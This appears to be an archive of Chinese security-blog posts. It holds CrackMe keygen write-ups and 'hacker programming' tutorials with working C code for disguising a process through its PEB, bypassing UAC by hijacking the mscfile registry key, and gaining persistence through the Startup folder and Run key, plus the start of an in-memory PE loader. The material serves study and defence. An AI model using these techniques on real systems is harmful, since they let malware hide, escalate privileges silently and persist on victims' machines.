ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; Msvbvm50.__vbaHresultCheckObj004081E9 &gt; 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]004081EF . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; 获取输入的name004081F2 . 50 push eax ; /String = 00004000 ???004081F3 . 8B1A mov ebx,dword ptr ds:[edx] ; |004081F5 . FF15 F8B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \\获取name长度004081FB . 8BF8 mov edi,eax004081FD . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18]00408200 . 69FF 385B0100 imul edi,edi,0x15B38 ; 长度乘以0x15B3800408206 . 51 push ecx ; /String = 091C840A ???00408207 . 0F80 B7050000 jo AfKayAs_.004087C4 ; |0040820D . FF15 0CB14000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\获取输入name的第一次ascii码00408213 . 0FBFD0 movsx edx,ax00408216 . 03FA add edi,edx ; 长度计算后加上name[0]00408218 . 0F80 A6050000 jo AfKayAs_.004087C40040821E . 57 push edi ; Msvbvm50.__vbaObjSet0040821F . FF15 F4B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; 转字符串（十进制） 然后将结果转为浮点数执行了几次操作。 第一次 123456789101112131415161718004082E9 . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; 转为浮点数004082EF . D905 08104000 fld dword ptr ds:[0x401008] ; １０004082F5 . 833D 00904000&gt;cmp dword ptr ds:[0x409000],0x0004082FC . 75 08 jnz short AfKayAs_.00408306004082FE . D835 0C104000 fdiv dword ptr ds:[0x40100C] ; １０／５00408304 . EB 0B jmp short AfKayAs_.0040831100408306 &gt; FF35 0C104000 push dword ptr ds:[0x40100C]0040830C . E8 578DFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;00408311 &gt; 83EC 08 sub esp,0x800408314 . DFE0 fstsw ax00408316 . A8 0D test al,0xD00408318 . 0F85 A1040000 jnz AfKayAs_.004087BF0040831E . DEC1 faddp st(1),st ; ＋２00408320 . DFE0 fstsw ax00408322 . A8 0D test al,0xD00408324 . 0F85 95040000 jnz AfKayAs_.004087BF0040832A . DD1C24 fstp qword ptr ss:[esp]0040832D . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; 转回去 第二次 123456789004083F5 . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; Msvbvm50.__vbaR8Str004083FB . DC0D 10104000 fmul qword ptr ds:[0x401010] ; ＊３00408401 . 83EC 08 sub esp,0x800408404 . DC25 18104000 fsub qword ptr ds:[0x401018] ; －２0040840A . DFE0 fstsw ax0040840C . A8 0D test al,0xD0040840E . 0F85 AB030000 jnz AfKayAs_.004087BF00408414 . DD1C24 fstp qword ptr ss:[esp]00408417 . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; Msvbvm50.__vbaStrR8 第三次 12345678004084DF . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; Msvbvm50.__vbaR8Str004084E5 . DC25 20104000 fsub qword ptr ds:[0x401020] ; ＋１５004084EB . 83EC 08 sub esp,0x8004084EE . DFE0 fstsw ax004084F0 . A8 0D test al,0xD004084F2 . 0F85 C7020000 jnz AfKayAs_.004087BF004084F8 . DD1C24 fstp qword ptr ss:[esp]004084FB . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; Msvbvm50.__vbaStrR8 最后的比较也是使用浮点数进行比较，用计算出结果除以我们输入，再与1进行比较。 12345678910111213141516004085F1 . DCBD 1CFFFFFF fdivr qword ptr ss:[ebp-0xE4] ; 计算的ｓｅｒｉａｌ／输入004085F7 . EB 11 jmp short AfKayAs_.0040860A004085F9 &gt; FFB5 20FFFFFF push dword ptr ss:[ebp-0xE0]004085FF . FFB5 1CFFFFFF push dword ptr ss:[ebp-0xE4]00408605 . E8 888AFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;0040860A &gt; DFE0 fstsw ax0040860C . A8 0D test al,0xD0040860E . 0F85 AB010000 jnz AfKayAs_.004087BF00408614 . FF15 34B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;; Msvbvm50.__vbaFpR80040861A . DC1D 28104000 fcomp qword ptr ds:[0x401028] ; 结果与１进行比较00408620 . DFE0 fstsw ax ; 将寄存器的值传给ＡＸ00408622 . F6C4 40 test ah,0x40 ; 比较ａｈ值与０ｘ４０00408625 . 74 07 je short AfKayAs_.0040862E ; 若不相等就会跳到清空ｅｓｉ处00408627 . BE 01000000 mov esi,0x1 ; 相等ｅｓｉ赋值１0040862C . EB 02 jmp short AfKayAs_.004086300040862E &gt; 33F6 xor esi,esi ; 清空寄存器 这里 fcomp是比较后改变寄存器状态，然后再由fstsw指令将寄存器值传给ax 比较结果 C3 C0 ST(0)&gt;源操作数 0 0 ST(0)&lt;源操作数 0 1 ST(0)=源操作数 1 0 ST(0)不可比较 1 1 看一下FST寄存器，看到寄存器中的值，此时是输入等于计算的时候，看到FST是4000，C3是1 计算器转换一下看的仔细 注册机12345678910111213141516#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name, 20); int len = strlen(name); int serial; serial = len * 0x15B38; serial += name[0]; serial = (serial + 2) * 3 - 2 + 15; printf(&quot;serial:%d\\n&quot;, serial); return 0;&#125; 输入正确的serial","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"隐藏技术-进程伪装","slug":"隐藏技术-进程伪装","date":"2021-07-21T06:02:59.000Z","updated":"2021-08-09T10:52:36.592Z","comments":true,"path":"2021/07/21/隐藏技术-进程伪装/","link":"","permalink":"https://b1ackie.cn/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/","excerpt":"","text":"进程伪装进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。 实现原理实现起来原理并不复杂，就是修改指定进程的进程环境块PEB中的进程路径以及命令行信息即可。下面使用Windbg来查看一下notepad的相关信息。 查看PEB的相关信息，可以看到ProcessParameters，这里有进程的路径和命令行相关信息。 继续查看这个结构，可以看到ImagePathName和CommandLine，也可以看到其中的信息都是”C:\\Windows\\system32\\notepad.exe” 编码实现 获取PEB地址 获取ProcessParameters 写入伪装信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// DisguiseProcess.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;winternl.h&gt;#include &lt;process.h&gt;typedef NTSTATUS(NTAPI* typedef_NtQueryInformationProcess)( IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL );/*PID：需要进行伪装的进程PID* lpwszpath：伪装路径* lpwszcmd：伪装命令行*/BOOL DisguiseProcess(DWORD PID, wchar_t* lpwszPath, wchar_t* lpwszCmd) &#123; //打开进程获取句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL; PROCESS_BASIC_INFORMATION pbi = &#123; 0 &#125;; PEB peb = &#123; 0 &#125;; RTL_USER_PROCESS_PARAMETERS Param = &#123; 0 &#125;; USHORT usCmdLen = 0; USHORT usPathLen = 0; NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibraryA(&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;); if (NtQueryInformationProcess == NULL) &#123; printf(&quot;获取函数地址失败\\n&quot;); return FALSE; &#125; NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, sizeof(pbi), NULL); if (!NT_SUCCESS(status)) &#123; printf(&quot;获取进程信息失败\\n&quot;); return FALSE; &#125; //获取peb的地址 ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(peb), NULL); //获取ProcessParameters地址 ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, sizeof(Param), NULL); usCmdLen = 2 + 2 * wcslen(lpwszCmd); //写入命令行信息 WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL); WriteProcessMemory(hProcess, &amp;Param.CommandLine.Length, &amp;usCmdLen, sizeof(usCmdLen), NULL); usPathLen = 2 + 2 * wcslen(lpwszPath); //写入路径信息 WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL); WriteProcessMemory(hProcess, &amp;Param.ImagePathName.Length, &amp;usPathLen, sizeof(usPathLen), NULL); return TRUE;&#125;int main()&#123; //伪装自身获取自身PID，如果伪装其他程序可以通过窗口或者进程名方式获得PID if (DisguiseProcess(_getpid(), L&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;, L&quot;C:\\\\Windows\\\\Syetem32\\\\notepad.exe&quot;) == FALSE) &#123; printf(&quot;进程伪装失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;伪装成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 运行伪装程序，提示伪装成功 然后使用Process Explorer查看伪装程序的相关信息。可以看到进程已经伪装成功，描述这里写着记事本，路径和命令行都是我们写入的伪装信息。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ackie.cn/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"提权技术-Bypass UAC","slug":"提权技术-Bypass UAC","date":"2021-07-20T06:24:40.000Z","updated":"2021-08-09T10:52:25.166Z","comments":true,"path":"2021/07/20/提权技术-Bypass UAC/","link":"","permalink":"https://b1ackie.cn/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/","excerpt":"","text":"Bypass UACUAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。 正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。 在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。 下面拿白名单程序CompMgmtLauncher来进行一下分析。 分析CompMgmtLauncher启动过程打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\\Software\\Classes\\mscfile\\shell\\open\\command中的值。 可以看一下，此路径中存在什么，可以看到其中没有值 如果该路径没有值，然后就会查询HKCR\\mscfile\\shell\\open\\command，查看其中的值，存储这mmc.exe进程的路径信息。 现在可以知道，当它启动时，会先查看HKCU\\Software\\Classes\\mscfile\\shell\\open\\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。 现在就修改注册表信息，在HKCU\\Software\\Classes\\mscfile\\shell\\open\\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。 实现1234567891011121314151617181920212223#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; PVOID OldValue = NULL; //关闭重定位 Wow64DisableWow64FsRedirection(&amp;OldValue); HKEY hKey = NULL; RegCreateKeyEx(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\mscfile\\\\Shell\\\\Open\\\\Command&quot;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;hKey, NULL); if (hKey == NULL) &#123; printf(&quot;创建键值失败\\n&quot;); return FALSE; &#125; RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;, (strlen(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;) + 1)); RegCloseKey(hKey); system(&quot;CompMgmtLauncher.exe&quot;); Wow64RevertWow64FsRedirection(OldValue); system(&quot;pause&quot;); return 0;&#125; 这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。 使用procmon工具查看权限可以看到权限是高 正常启动查看权限可以看到是中。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"提权技术","slug":"提权技术","permalink":"https://b1ackie.cn/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"},{"name":"UAC","slug":"UAC","permalink":"https://b1ackie.cn/tags/UAC/"}]},{"title":"160CrackMe-002","slug":"160CrackMe-002","date":"2021-07-20T02:17:33.000Z","updated":"2021-08-09T10:55:33.726Z","comments":true,"path":"2021/07/20/160CrackMe-002/","link":"","permalink":"https://b1ackie.cn/2021/07/20/160CrackMe-002/","excerpt":"","text":"初探打开程序，看到提示输入name和serial，输入后，提示错误。 分析查壳，看到程序没有加壳，是用VB语言写的。 使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转 开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。 1234567891011121314151600402412 . 50 push eax ; /String = 0000000A ???00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; |00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \\__vbaLenBstr0040241B . 8BF8 mov edi,eax ; 获取输入的name长度传入edi以便运算0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18]00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; 长度乘0x17CFB00402426 . 51 push ecx ; /String = 80020004 ???00402427 . 0F80 91020000 jo Afkayas_.004026BE ; |0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\rtcAnsiValueBstr00402433 . 0FBFD0 movsx edx,ax ; 获取输入的第一个ascii传给edx00402436 . 03FA add edi,edx ; 乘法后的结果加上第一个ascii00402438 . 0F80 80020000 jo Afkayas_.004026BE0040243E . 57 push edi ; MSVBVM50.__vbaStrCat0040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ; 计算结果转为字符串（十进制）00402445 . 8BD0 mov edx,eax00402447 . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。 1234567891011121300402510 &gt; \\8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; 输入的Serial00402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] ; 计算后的结果00402516 . 8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;; MSVBVM50.__vbaStrCat0040251C . 50 push eax0040251D . 68 701B4000 push Afkayas_.00401B70 ; AKA-00402522 . 51 push ecx ; /String = 80020004 ???00402523 . FFD7 call edi ; \\将AKA- 与计算后的数值拼接起来00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;; MSVBVM50.__vbaStrMove0040252B . 8BD0 mov edx,eax0040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]00402530 . FFD3 call ebx ; MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;00402532 . 50 push eax00402533 . FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;; 比较 注册机编写根据分析的结果进行注册机编写 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main() &#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name, 20); int length = strlen(name); int num = length * 0x17CFB; num += name[0]; char* s1 = &quot;AKA-&quot;; char* serial = (char*)malloc(100); sprintf(serial, &quot;%s%d&quot;,s1,num); printf(&quot;用户名是%s\\n注册码是%s\\n&quot;,name, serial); return 0;&#125; 运行输入name:b1ackie，输出serial:AKA-682815。 输入正确的name和serial后，弹出正确提示","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"自启动技术-快速启动目录","slug":"自启动技术-快速启动目录","date":"2021-07-19T09:11:43.000Z","updated":"2021-08-09T10:53:21.574Z","comments":true,"path":"2021/07/19/自启动技术-快速启动目录/","link":"","permalink":"https://b1ackie.cn/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/","excerpt":"","text":"快速启动目录Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。 函数说明SHGetSpecialFolderPath获取指定的系统路径 123456BOOL SHGetSpecialFolderPath( HWND hwndOwner, LPSTR lpszPath, int nFolder, BOOL fCreate); hwndOwner：窗口所有者句柄 lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH nFolder：系统路径的CSIDL标识。 值 含义 CSIDL_BITBUCKET 桌面\\回收站 CSIDL_CONTROLS 我的电脑\\控制面板 CSIDL_DESKTOP 桌面 CSIDL_DRIVES 我的电脑 CSIDL_STARTUP 开始菜单\\程序\\启动 CSIDL_SYSTEM SYSTEM文件夹 CSIDL_WINDOWS WINDOWS目录 fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。 返回值：成功TRUE；失败FALSE。 具体实现获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;shlobj.h&gt;BOOL AutoRun(char* lpszSrcFilePath, char* lpszDestFileName) &#123; char szStartUpPath[MAX_PATH] = &#123; 0 &#125;; char szDestFilePath[MAX_PATH] = &#123; 0 &#125;; //获取快速启动目录 if (SHGetSpecialFolderPathA(NULL, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123; printf(&quot;获取系统路径失败\\n&quot;); return FALSE; &#125; //将数据写入指定的缓冲区 wsprintfA(szDestFilePath, &quot;%s\\\\%s&quot;, szStartUpPath, lpszDestFileName); //将文件内容拷贝到缓冲区 if (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123; printf(&quot;向快速启动目录写入失败\\n&quot;); return FALSE; &#125; return TRUE;&#125;int main() &#123; if (AutoRun(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;, &quot;TestApc.exe&quot;) == FALSE) &#123; printf(&quot;失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 在物理机中运行一下此程序，火绒马上提醒 在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序 使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ackie.cn/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"自启动技术-注册表","slug":"自启动技术-注册表","date":"2021-07-19T06:13:39.000Z","updated":"2021-08-11T08:43:32.660Z","comments":true,"path":"2021/07/19/自启动技术-注册表/","link":"","permalink":"https://b1ackie.cn/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/","excerpt":"","text":"注册表方式实现自启动实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。 函数介绍RegOpenKeyEx打开一个指定的注册表键 1234567LSTATUS RegOpenKeyExA( HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult); hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一： HKEY_CLASSES_ROOT HKEY_CURRENT_CONFIG HKEY_CURRENT_USER HKEY_LOCAL_MACHINE HKEY_USERS lpSubKey：将打开的注册表子项的名称 ulOptions：保留，必须设置为0 samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合 值 含义 KEY_CREATE_LINK 准许生成符号键 KET_CREATE_SUB_KEY 准许生成子键 KEY_ENUMERATE_SUB_KEYS 准许生成枚举子键 KEY_EXECUTE 准许进行读操作 KEY_NOTIFY 准许更换通告 KEY_QUERY_VALUE 准许查询子键 KEY_ALL_ACESS 提供完全访问，它是上面数值的组合 KEY_READ 是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合 KEY_SET_VALUE 准许设置子键的数值 KEY_WRITE 是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合 KEY_WOW64_32KEY 表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。 KEY_WOW64_64KEY 表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。 phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。 返回值：如果成功，返回0；失败返回一个非零的错误代码。 RegSetValueEx函数在注册表项下设置指定值得数据和类型 12345678LSTATUS RegSetValueExA( HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData); hKey：指定一个已打开项的句柄，或一个标准项名。 lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。 Reserved：保留值，必须为0； dwType：指定将存储的数据类型，该参数可以为以下值之一。 值 含义 REG_BINARY 任何形式的二进制数据 REG_DWORD 一个32位的数字 REG_DWORD_LITTLE_ENDIAN 一个格式为“低字节在前”的32位数字 REG_DWORD_BIG_ENDIAN 一个格式为“高字节在前”的32位数字 REG_EXPAND_SZ 一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”） REG_LINK 一个Unicode格式的带符号链接 REG_MULTI_SZ 一个以0结尾的字符串数组，该数组以链接两个0作为终止符 REG_ONE 未定义值类型 REG_RESOURCE_LIST 一个设备驱动器资源列表 REG_SZ 一个以0结尾的字符串 lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。 cbData：指定由lpData参数所指向的数据大小，单位是字节。 返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。 实现原理对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。 这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]和[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。 123456789101112131415161718192021222324252627282930#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;BOOL Register(char* lpszFileName, char* lpszValueName) &#123; HKEY hKey; if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;, 0, KEY_WRITE, &amp;hKey) != 0) &#123; printf(&quot;打开注册表失败\\n&quot;); return FALSE; &#125; if (RegSetValueEx(hKey, lpszValueName, 0, REG_SZ, (BYTE*)lpszFileName, (lstrlen(lpszFileName) + 1)) != 0) &#123; printf(&quot;设置注册表值失败\\n&quot;); RegCloseKey(hKey); return FALSE; &#125; RegCloseKey(hKey); return TRUE;&#125;int main()&#123; if (Register(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\Register.exe&quot;, &quot;b1ackie&quot;) == FALSE) &#123; printf(&quot;自启动失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;自启动成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 打开程序，提示自启动成功，说明注册表设置成功。 用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。 也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ackie.cn/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"启动技术-内存直接加载运行","slug":"启动技术-内存直接加载运行","date":"2021-07-15T06:28:21.000Z","updated":"2021-11-22T10:59:30.672Z","comments":true,"path":"2021/07/15/启动技术-内存直接加载运行/","link":"","permalink":"https://b1ackie.cn/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/","excerpt":"","text":"内存直接加载运行内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。 实现原理构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。 具体实现打开文件并且获取大小 12345678910111213char* FileName = &quot;自己的文件路径&quot;;//打开文件HANDLE hFile = CreateFileA(FileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);//获取大小DWORD dwFileSize = GetFileSize(hFile, NULL);//申请内存空间PBYTE pData = new BYTE[dwFileSize];DWORD dwRet = 0;//将文件读取到内存中ReadFile(hFile, pData, dwFileSize, &amp;dwRet, NULL);CloseHandle(hFile); 获取sizeofimage12345678910/*获取PE文件的镜像大小，获取加载到内存后的大小* lpData内存中的基址*/DWORD GetImageSize(LPVOID lpData) &#123; DWORD dwSizeOfImage = 0; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage; return dwSizeOfImage;&#125; 